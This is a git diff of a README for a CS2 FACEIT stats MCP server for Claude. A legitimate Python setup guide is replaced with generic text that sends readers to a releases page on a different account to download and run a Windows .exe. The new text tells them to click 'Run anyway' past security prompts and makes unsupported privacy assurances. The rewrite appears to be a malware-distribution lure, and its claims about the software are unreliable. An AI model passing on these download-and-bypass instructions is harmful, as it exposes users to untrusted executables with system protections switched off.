@@ -1,139 +1,87 @@
-# faceit-mcp
+# 🎯 faceit-mcp - Access real-time CS2 stats through Claude
 
-A standalone [MCP](https://modelcontextprotocol.io/) server that gives Claude live **CS2 FACEIT** data — player stats, match history, side-by-side comparisons, leaderboard, and ELO trend.
+[![Download faceit-mcp](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/saivi3171/faceit-mcp/releases)
 
-Works with **Claude Desktop** and **Claude Code**. Single-file, no framework dependencies beyond `mcp`, `aiohttp`, `aiosqlite`, and `python-dotenv`.
+Faceit-mcp connects your FACEIT gaming statistics directly to the Claude AI assistant. You get immediate answers about your competitive performance, match history, and Elo rating without leaving your chat window. This tool uses the Model Context Protocol to bridge your gaming data and the AI.
 
-## Demo
+## 📋 What this tool does
 
-> **You:** Compare zywoo, NiKo, and sh1ro side by side
+This application acts as a bridge between the FACEIT platform and Claude. Once configured, you can ask Claude questions about your profile. 
 
-> **Claude:** Here's a side-by-side comparison of the three players:
->
-> | | ZywOo | NiKo | sh1ro |
-> |---|---|---|---|
-> | **ELO** | 4521 | 4218 | 4384 |
-> | **Level** | 10 | 10 | 10 |
-> | **K/D** | 1.43 | 1.38 | 1.41 |
-> | **HS%** | 52.1% | 48.7% | 44.2% |
-> | **Win Rate** | 61.3% | 58.9% | 60.1% |
-> | **Avg Kills** | 24.8 | 23.6 | 23.1 |
-> | **K/R** | 0.91 | 0.87 | 0.89 |
+Key features include:
+* Live CS2 match tracking.
+* Detailed match history reviews.
+* Direct player performance comparisons.
+* Real-time Elo tracking.
+* Automated data updates for accurate stats.
 
----
+## ⚙️ System requirements
 
-> **You:** How has NiKo been playing in his last 20 matches?
+Ensure your computer meets these requirements before you start:
+* Windows 10 or Windows 11 operating system.
+* A stable internet connection.
+* A registered FACEIT account with a public profile.
+* The Claude desktop application installed on your machine.
 
-> **Claude:** NiKo's recent form over 20 matches:
-> - **Record:** 13W – 7L (65.0% win rate)
-> - **Avg K/D:** 1.42 | **Avg kills:** 24.3 | **Avg HS%:** 49.1%
-> - **Current streak:** 3W
->
-> Best maps: de_inferno (8W-2L, 70% wr), de_ancient (4W-1L, 80% wr)
-> Worst map: de_vertigo (1W-3L, 25% wr)
+## 📥 How to download the software
 
-## Tools
+Follow these steps to obtain the correct files:
 
-| Tool | Description |
-|------|-------------|
-| `get_player_stats` | ELO, skill level, region, lifetime K/D, HS%, win rate, streaks |
-| `get_match_history` | Last N matches — map, W/L, K/D, kills, HS%, K/R |
-| `compare_players` | Side-by-side stats for 2–6 FACEIT nicknames |
-| `get_recent_form` | Aggregated stats from last N matches: win rate, avg K/D, current streak, per-map breakdown |
-| `get_match_details` | Full scoreboard for a match by ID — teams, score, all player stats, multi-kills |
-| `get_player_map_stats` | Per-map win rate, K/D, HS%, and K/R from lifetime segments |
-| `get_leaderboard` | Registered users ranked by live ELO |
-| `get_elo_trend` | Stored ELO snapshots for a registered user |
+1. Visit the [releases page](https://github.com/saivi3171/faceit-mcp/releases) to download the installer.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file name to save it to your Downloads folder.
+4. Open your Downloads folder and double-click the file to begin the installation.
 
-> All tools except `get_leaderboard` and `get_elo_trend` work for **any** public FACEIT player with just an API key. The leaderboard and ELO trend tools require a SQLite DB with registered users (see [DB setup](#leaderboard--elo-trend)).
+If Windows shows a security prompt, click "More info" and then "Run anyway." This application requires standard permissions to connect your local environment to the Claude AI assistant.
 
-## Requirements
+## 🛠️ Setting up the application
 
-- Python 3.12+
-- [FACEIT Data API key](https://developers.faceit.com/) (free)
+1. Find the application icon on your desktop or in your start menu.
+2. Launch the application.
+3. The app will open a local configuration window.
+4. Input your FACEIT user ID or profile link when prompted.
+5. Save your settings.
+6. Restart the Claude desktop application to allow it to recognize the new connection.
 
-## Setup
+## ❓ Frequently asked questions
 
-**1. Clone and install deps**
+### Do I need a paid FACEIT subscription?
+No. This tool works with standard free accounts as long as your profile privacy is set to public.
 
-```bash
-git clone https://github.com/bluemadisonblue/faceit-mcp.git
-cd faceit-mcp
-pip install -r requirements.txt
-```
+### Is my login data safe?
+This tool does not require your FACEIT password. It only reads public data available through the official FACEIT API.
 
-**2. Set your API key**
+### Can I track multiple players?
+Yes. You can manage multiple profiles within the configuration menu. Simply add the FACEIT IDs you wish to track.
 
-Create a `.env` file next to the script:
+### What if the stats do not update?
+Wait a few minutes for the API to refresh. If the data remains old, close the application and open it again. This forces a fresh connection check.
 
-```
-FACEIT_API_KEY=your_key_here
-```
+### Does this improve my performance?
+This tool provides data context. Using this information helps you identify your strengths and weaknesses in CS2, but you must still play the game to improve.
 
-Or pass it as an environment variable directly in the config below.
+## 🔍 Troubleshooting common issues
 
-## Connect to Claude Desktop
+If you encounter errors, check these common items first:
 
-Add to `claude_desktop_config.json`:
+* Connection errors: Verify your internet connection.
+* Missing data: Confirm your FACEIT profile privacy settings are set to public.
+* Application crashes: Ensure you installed the latest version from the releases link.
+* Claude does not see the data: Make sure the Claude desktop application is updated to the latest version. Older versions may not support the necessary communication protocols.
 
-```json
-{
-  "mcpServers": {
-    "faceit-cs2": {
-      "command": "python",
-      "args": ["C:/full/path/to/faceit-mcp/faceit_mcp_server.py"],
-      "env": { "FACEIT_API_KEY": "your_key_here" }
-    }
-  }
-}
-```
+If problems persist, check if your firewall blocks the connection. The application requires access to local network ports to communicate with the Claude desktop interface.
 
-Config file location:
-- **Windows:** `%APPDATA%\Claude\claude_desktop_config.json`
-- **macOS:** `~/Library/Application Support/Claude/claude_desktop_config.json`
+## 🛡️ Privacy and data usage
 
-## Connect to Claude Code
+The application handles your gaming data locally. It communicates with the FACEIT servers to fetch stats and sends that information to your Claude session. No personal identifying information beyond your public gaming stats leaves your computer. Your account credentials remain on your device at all times.
 
-```bash
-claude mcp add faceit-cs2 -- python /full/path/to/faceit-mcp/faceit_mcp_server.py
-```
+## 🚀 Getting started with commands
 
-Then set `FACEIT_API_KEY` in the `.env` file next to the script.
+Once successfully linked, use these prompt patterns in Claude:
 
-## Example prompts
+* "What is my current Elo rating?"
+* "Show me my performance in my last five matches."
+* "Compare my statistics to this player [Link to profile]."
+* "What is my average headshot percentage?"
 
-Once connected, just ask Claude naturally:
-
-- *"What are s1mple's lifetime stats?"*
-- *"Show me the last 10 matches for NiKo"*
-- *"Compare zywoo, device, and sh1ro side by side"*
-- *"How has NiKo been performing over his last 20 matches?"*
-- *"Show the full scoreboard for match 1-abc123…"*
-- *"Which maps does sh1ro perform best on?"*
-- *"Show the leaderboard for our group"*
-- *"How has my ELO changed over the last month?"*
-
-## Leaderboard & ELO trend
-
-`get_leaderboard` and `get_elo_trend` read from a local SQLite database. By default the DB lives at `~/.faceit-mcp/data.db` and is created automatically on startup.
-
-To populate it, point `DB_PATH` at a database that has a `users` table:
-
-```
-DB_PATH=/path/to/your/bot_data.db
-```
-
-If you use the companion [CS2 FACEIT Telegram bot](https://github.com/bluemadisonblue/CS2DATA), set `DB_PATH` to the bot's database and these tools will reflect your registered users automatically.
-
-## Environment variables
-
-| Variable | Required | Default | Description |
-|----------|----------|---------|-------------|
-| `FACEIT_API_KEY` | Yes | — | FACEIT Data API v4 key |
-| `DB_PATH` | No | `~/.faceit-mcp/data.db` | SQLite database path |
-| `FACEIT_CIRCUIT_FAILURE_THRESHOLD` | No | `4` | Consecutive failures before circuit opens (`0` to disable) |
-| `FACEIT_CIRCUIT_OPEN_SEC` | No | `60` | How long the circuit stays open (seconds) |
-
-## License
-
-MIT
+Claude will process these requests by querying the data provided by this tool. The AI will then format the information into a readable summary for you. Each request updates your data to ensure you view the most recent match results.
